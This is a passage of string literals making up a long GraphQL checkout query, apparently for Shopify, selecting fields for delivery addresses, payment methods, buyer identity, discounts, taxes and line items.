    "currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude "
    "__typename}phone __typename}__typename}groupType targetMerchandise{"
    "...on PurchaseOrderMerchandiseLine{stableId quantity{"
    "...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{"
    "...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}"
    "__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity "
    "merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails "
    "__typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId "
    "componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{"
    "...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}"
    "__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle "
    "lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle "
    "deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable "
    "__typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename"
    "...on StreetAddress{name firstName lastName company address1 address2 city countryCode "
    "zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}"
    "postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId "
    "paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}"
    "billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}__typename}"
    "...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable "
    "defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{"
    "...on StreetAddress{address1 address2 city company countryCode firstName lastName phone "
    "postalCode zoneCode __typename}__typename}__typename}"
    "...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code "
    "__typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{"
    "billingAddress{...on StreetAddress{firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}"
    "__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}"
    "...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}"
    "...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}data signature version __typename}"
    "...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion "
    "__typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName "
    "lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}"
    "...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{"
    "...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode "
    "postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}"
    "disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand "
    "lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name "
    "walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName "
    "billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}additionalParameters{"
    "...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}"
    "...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier "
    "billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{"
    "paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName "
    "company address1 address2 city countryCode zoneCode postalCode coordinates{latitude "
    "longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}"
    "__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id "
    "paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude "
    "__typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}"
    "...on CustomPaymentMethod{additionalDetails name paymentInstructions id "
    "paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude "
    "__typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}"
    "...on DeferredPaymentMethod{orderingIndex displayName __typename}"
    "...on PaypalBillingAgreementPaymentMethod{token billingAddress{"
    "...on StreetAddress{address1 address2 city company countryCode firstName lastName phone "
    "postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{"
    "redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind "
    "billingAddress{...on StreetAddress{firstName lastName company address1 address2 city "
    "countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}"
    "...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier "
    "paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId "
    "__typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name "
    "__typename}__typename}__typename}__typename}__typename}buyerIdentity{"
    "...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{"
    "email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}"
    "marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}"
    "...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{"
    "__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}"
    "__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName "
    "countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone "
    "__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{"
    "editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName "
    "acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone "
    "market{id handle __typename}__typename}}purchasingCompany{company{id externalId name "
    "__typename}contact{locationCount __typename}location{id externalId name __typename}"
    "__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee "
    "merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{"
    "checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{"
    "amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}"
    "quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}"
    "totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{"
    "amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode "
    "__typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{"
    "referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}"
    "__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{"
    "...PurchaseOrderLineComponent __typename}quantity{__typename"
    "...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{"
    "__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{"
    "__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}"
    "__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{"
    "amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}"
    "totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{"
    "...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees "
    "totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode "
    "__typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}"
    "legacyAggregatedMerchandiseTermsAsFees{title description total{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}"
    "optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{"
    "tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping "
    "note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{"
    "vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title "
    "__typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}"
    "checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount "
    "currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{"
    "__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt "
    "subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}}__typename}metafields{key namespace value valueType:type __typename}}"
    "fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId "
    "options{name value __typename}productTitle title productUrl untranslatedTitle "
    "untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid "
    "subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval "
    "deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}"
    "digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})"
    "two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})"
    "__typename}price{amount currencyCode __typename}productId productType properties{"
    "...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit "
    "value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{"
    "...on MerchandisePropertyValueString{string:value __typename}"
    "...on MerchandisePropertyValueInt{int:value __typename}"
    "...on MerchandisePropertyValueFloat{float:value __typename}"
    "...on MerchandisePropertyValueBoolean{boolean:value __typename}"
    "...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}"
    "fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description "
    "presentationLevel allocationMethod targetSelection targetType signature signatureUuid type "
    "value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem "
    "fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel "
    "allocationMethod message targetSelection targetType value{...on PercentageValue{percentage "
    "__typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}"
    "...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection "
    "targetType value{...on PercentageValue{percentage __typename}"
    "...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}"
    "fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId "
    "merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{"
    "checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{"
    "amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}"
    "quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}"
    "totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{"
    "amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode "
    "__typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{"
    "referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}"
    "__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}"
    "fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title "
    "__typename}totalAmount{__typename amount currencyCode}__typename}"
    "fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId "
    "componentCapabilities componentSource merchandise{"
    "...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{"
    "checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{"
    "amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}"
    "quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}"
    "totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{"
    "amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode "
    "__typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{"
    "referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}"
    "__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}"
    "fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title "
    "__typename}totalAmount{__typename amount currencyCode}__typename}"
    "fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{"
    "...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}"
    "deliveryAllocations{amount{amount currencyCode __typename}discount{"
    "...DiscountDetailsFragment __typename}index stableId targetType __typename}"
    "merchandiseAllocations{amount{amount currencyCode __typename}discount{"
    "...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}"
    "fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email "
    "phone customer{...on CustomerProfile{email __typename}"
    "...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}"
    "merchandiseDiscount{...ProposalDiscountFragment __typename}"
    "deliveryDiscount{...ProposalDiscountFragment __typename}"
    "delivery{...ProposalDeliveryFragment __typename}merchandise{"
    "...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{"
    "...SourceProvidedMerchandise...ProductVariantMerchandiseDetails"
    "...ContextualizedProductVariantMerchandiseDetails"
    "...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount "
    "recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}"
    "lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}"
    "components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}"
    "__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}deferredTotal{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}dueAt __typename}hasOnlyDeferredShipping "
    "subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "legacyAggregatedMerchandiseTermsAsFees{title description total{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId "
    "__typename}...on DraftOrderAttributions{userIdentifier:userId sourceName "
    "locationIdentifier:locationId __typename}__typename}__typename}"
    "saleAttributions{attributions{...on SaleAttribution{recipient{"
    "...on StaffMember{id __typename}...on Location{id __typename}"
    "...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{"
    "...FilledMerchandiseLineTargetCollectionFragment"
    "...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}"
    "__typename}nonNegotiableTerms{signature contents{signature targetTerms "
    "targetLine{allLines index __typename}attributes __typename}__typename}__typename}"
    "fragment ProposalDiscountFragment on DiscountTermsV2{__typename"
    "...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{"
    "...DiscountLineDetailsFragment __typename}__typename}"
    "...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}"
    "fragment DiscountLineDetailsFragment on DiscountLine{allocations{"
    "...on DiscountAllocatedAllocationSet{__typename allocations{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "target{index targetType stableId __typename}__typename}}__typename}discount{"
    "...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}__typename}"
    "fragment ProposalDeliveryFragment on DeliveryTerms{__typename"
    "...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion "
    "shippingRatesStatusToken deliveryLines{destinationAddress{"
    "...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode "
    "zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}"
    "...on Geolocation{country{code __typename}zone{code __typename}"
    "coordinates{latitude longitude __typename}postalCode __typename}"
    "...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode "
    "zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}"
    "targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType "
    "deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle "
    "__typename}...on DeliveryStrategyReference{handle __typename}__typename}"
    "availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description "
    "code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl "
    "lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name "
    "__typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}discountRecurringCycleLimit "
    "excludeFromDeliveryOptionPrice targetMerchandise{"
    "...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime "
    "maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}"
    "displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound "
    "upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 "
    "city countryCode phone postalCode zoneCode __typename}instructions name __typename}"
    "...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode "
    "postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime "
    "closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl "
    "fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}"
    "...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}"
    "fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{"
    "linesV2{...on MerchandiseLine{stableId quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}"
    "totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}"
    "totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}"
    "totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}"
    "__typename}__typename}__typename}__typename}"
    "fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{"
    "...on SourceProvidedMerchandise{__typename requiresShipping}"
    "...on ProductVariantMerchandise{__typename requiresShipping}"
    "...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id "
    "digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval "
    "billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}"
    "__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}"
    "fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename "
    "product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier "
    "title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping "
    "price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{"
    "altText one:url(transform:{maxWidth:64,maxHeight:64})"
    "two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})"
    "__typename}options{name value __typename}properties{...MerchandiseProperties __typename}"
    "taxCode taxesIncluded weight{value unit __typename}sku}__typename}"
    "fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId "
    "title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType "
    "__typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})"
    "two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})"
    "__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value "
    "__typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard "
    "__typename}fragment ContextualizedProductVariantMerchandiseDetails on "
    "ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle "
    "untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType "
    "__typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})"
    "two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})"
    "__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value "
    "__typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{"
    "billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount "
    "__typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}"
    "fragment LineAllocationDetails on LineAllocation{stableId quantity "
    "totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount "
    "currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}"
    "checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{"
    "amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}"
    "unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue "
    "__typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment "
    "__typename}__typename}__typename}__typename}"
    "fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename "
    "stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails"
    "...ContextualizedProductVariantMerchandiseDetails"
    "...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount "
    "recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}"
    "fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{"
    "__typename stableId componentCapabilities componentSource merchandise{"
    "...SourceProvidedMerchandise...ProductVariantMerchandiseDetails"
    "...ContextualizedProductVariantMerchandiseDetails"
    "...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{"
    "...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}"
    "__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount "
    "recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}"
    "fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}"
    "fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment "
    "__typename}deliveryDiscount{...ProposalDiscountFragment __typename}"
    "deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}"
    "availableRedeemables{...on PendingTerms{taskId pollDelay __typename}"
    "...on AvailableRedeemables{availableRedeemables{paymentMethod{"
    "...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount "
    "currencyCode __typename}__typename}__typename}__typename}__typename}__typename}"
    "availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode "
    "zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}"
    "mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates "
    "progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id "
    "availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company "
    "address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude "
    "__typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}"
    "coordinates{latitude longitude __typename}postalCode __typename}"
    "...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode "
    "zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}"
    "targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType "
    "selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}"
    "deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{"
    "id __typename}title handle custom description code acceptsInstructions phoneRequired "
    "methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{"
    "handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl "
    "lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{"
    "...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime "
    "maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short "
    "long __typename}displayCheckoutRedesign estimatedTimeInTransit{"
    "...on IntIntervalConstraint{lowerBound upperBound __typename}"
    "...on IntValueConstraint{value __typename}__typename}amount{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 "
    "city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{"
    "unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 "
    "city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}"
    "businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name "
    "carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}"
    "__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode "
    "__typename}__typename}__typename}totalAmountAfterDiscounts{"
    "...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}"
    "amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}"
    "__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}"
    "deliveryStrategyHandles id title totalTitle __typename}__typename}"
    "...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}"
    "payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{"
    "...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex "
    "displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{"
    "...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative "
    "supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier "
    "name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}"
    "...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands "
    "orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{"
    "...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename "
    "availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier "
    "paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}"
